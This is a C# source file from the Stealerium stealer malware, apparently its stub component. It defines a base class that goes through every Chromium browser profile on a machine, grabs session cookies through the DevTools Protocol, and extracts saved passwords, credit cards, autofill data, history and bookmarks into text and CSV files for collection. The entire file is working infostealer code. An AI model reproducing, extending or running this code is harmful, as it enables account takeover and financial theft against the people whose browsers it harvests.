using System;
using System.Collections.Generic;
using System.IO;
using Stealerium.Stub.Helpers;
using Stealerium.Stub.Target.Browsers.Chromium;

namespace Stealerium.Stub.Target.Browsers
{
    internal abstract class ChromiumBasedBrowserRecovery
    {
        protected readonly string SavePath;
        protected readonly string BrowserDir;
        protected readonly string UserDataPath;
        protected readonly CdpCookieGrabber.BrowserType BrowserType;

        protected ChromiumBasedBrowserRecovery(string savePath, string browserName, string userDataPath, CdpCookieGrabber.BrowserType browserType)
        {
            SavePath = savePath;
            BrowserDir = Path.Combine(savePath, browserName);
            UserDataPath = userDataPath;
            BrowserType = browserType;
        }

        public void RecoverBrowserData()
        {
            if (!Directory.Exists(UserDataPath))
                return;

            Directory.CreateDirectory(BrowserDir);

            // Get cookies using CDP for all profiles
            RecoverCookies();

            // Get other data from each profile
            foreach (var profile in Directory.GetDirectories(UserDataPath))
            {
                if (File.Exists(Path.Combine(profile, "Login Data")))
                {
                    try
                    {
                        RecoverProfileData(profile);
                    }
                    catch (Exception ex)
                    {
                        Logging.Log($"{BrowserType} >> Failed to recover data from profile {profile}\n" + ex);
                    }
                }
            }
        }

        protected virtual void RecoverCookies()
        {
            try
            {
                Logging.Log($"{BrowserType} >> Starting cookie recovery via CDP");
                var cookies = CdpCookieGrabber.GetCookiesViaCdp(BrowserType).Result;
                Logging.Log($"{BrowserType} >> Found {cookies.Count} cookies");
                
                if (cookies.Count > 0)
                {
                    Counter.Cookies += cookies.Count;
                    var cookiePath = Path.Combine(BrowserDir, "Cookies.txt");
                    CBrowserUtils.WriteCookies(cookies, cookiePath);
                    Logging.Log($"{BrowserType} >> Cookies saved to {cookiePath}");
                }
            }
            catch (Exception ex)
            {
                Logging.Log($"{BrowserType} >> Failed to recover cookies via CDP\n" + ex);
            }
        }

        protected virtual void RecoverProfileData(string profilePath)
        {
            // Run tasks
            var creditCards = CreditCards.Get(Path.Combine(profilePath, "Web Data"));
            var autoFill = Autofill.Get(Path.Combine(profilePath, "Web Data"));
            var bookmarks = Bookmarks.Get(Path.Combine(profilePath, "Bookmarks"));
            var passwords = Chromium.Passwords.Get(Path.Combine(profilePath, "Login Data"));
            var history = History.Get(Path.Combine(profilePath, "History"));

            // Write results
            CBrowserUtils.WriteCreditCards(creditCards, Path.Combine(BrowserDir, "CreditCards.txt"));
            CBrowserUtils.WriteAutoFill(autoFill, Path.Combine(BrowserDir, "AutoFill.txt"));
            CBrowserUtils.WriteBookmarks(bookmarks, Path.Combine(BrowserDir, "Bookmarks.txt"));
            CBrowserUtils.WritePasswordsToTxt(passwords, Path.Combine(BrowserDir, "Passwords.txt"));
            CBrowserUtils.WritePasswordsToCsv(passwords, Path.Combine(BrowserDir, "Passwords.csv"));
            CBrowserUtils.WriteHistory(history, Path.Combine(BrowserDir, "History.txt"));

            // Create a README.txt file in the directory
            CBrowserUtils.CreateReadme(BrowserDir, passwords);
        }
    }
}
